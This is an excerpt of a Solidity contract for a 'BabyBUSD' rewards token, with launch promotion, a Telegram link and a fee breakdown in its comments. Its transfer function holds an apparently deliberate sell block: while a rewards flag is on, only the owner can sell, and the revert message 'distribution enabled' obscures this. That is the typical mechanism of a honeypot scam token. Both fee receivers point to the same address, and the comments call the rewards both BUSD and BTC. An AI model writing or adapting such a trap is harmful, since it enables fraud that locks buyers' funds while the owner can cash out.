...
// Stealth Launched
// [400]FTM Initial Liquidity 


// https://t.me/babybusdftm
// https://babybusd.digital


// Rewards in BUSD to Holders.
// 16% tax (3% lp, 10%rewards BTC, 3% Marketing)
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0xC931f61B1534EB21D8c11B24f3f5Ab2471d4aB50); // BUSD REWARDS
...
contract BabyBUSD is IBEP20, Auth {
    ...
    address EP = 0xC931f61B1534EB21D8c11B24f3f5Ab2471d4aB50; // BUSD REWARDS
    ...
    address public autoLiquidityReceiver=0xeDFA7498D1862Ab34913CFC4F7e25FEBd086D43b; //liq address
    address public marketingFeeReceiver=0xeDFA7498D1862Ab34913CFC4F7e25FEBd086D43b; // marketing address
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!EnableRewards || sender==owner), "distribution enabled");
